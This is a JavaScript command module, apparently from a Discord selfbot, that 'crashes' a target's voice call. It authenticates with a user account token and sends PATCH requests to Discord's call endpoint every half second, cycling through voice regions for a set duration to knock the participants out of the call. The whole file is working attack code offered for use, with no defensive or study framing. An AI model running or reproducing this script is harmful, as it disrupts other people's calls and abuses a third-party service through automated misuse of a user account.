module.exports = {
    desc: "crashes call",
    run: async function(Discord, message, client, quick) {
        message.delete()

        const args = message.content.substring(quick.getSetting('Prefix').length).split(' ')
        const command = args.shift();

        await message.channel.send(
            quick.embed(
                `Crashing call.`,
                `Reboot to stop.`
            )
        )

        const fetch = require('node-fetch');
        const call_endpoint = channel_id => `https://discord.com/api/v8/channels/${channel_id}/call`

        const regions = [
            'us-east',
            'us-west',
            'us-south',
            'us-central',
            'singapore',
            'japan',
            'hongkong',
            'southafrica',
            'russia',
            'india',
            'syndey',
            'europe',
            'brazil'
        ]

        const duration = args[1] || '20s'
        const vamp_channel_id = args[0]
        const SECONDS = 0.5
        const starting = 0
        const range = regions.length
        let current = 0

        let timer
        function RegionChangeLoop() {
            const REGION = starting + current++ % range
            ChangeRegion(vamp_channel_id, regions[REGION])
        }

        const intervalId = setInterval(RegionChangeLoop, SECONDS * 1000)

        async function ChangeRegion(channel_id, region) {
            const options = {
                method: 'patch',
                headers: {
                    'Authorization': process.env.USER_TOKEN,
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    region: region
                })
            }
            await fetch(call_endpoint(channel_id), options).then(res => {
                if (res.status == 204) {
                    if (timer) {
                        setTimeout(() => {
                            console.log('hi')
                            timer = setInterval(RegionChangeLoop, SECONDS * 1000)
                        }, 3000)
                        return clearImmediate(timer)
                    }
                }
            }).catch(err => console.log(`err: ${err}`))
        }

        setTimeout(function () {
            clearInterval(intervalId)
        },require('ms')(duration))
    }
}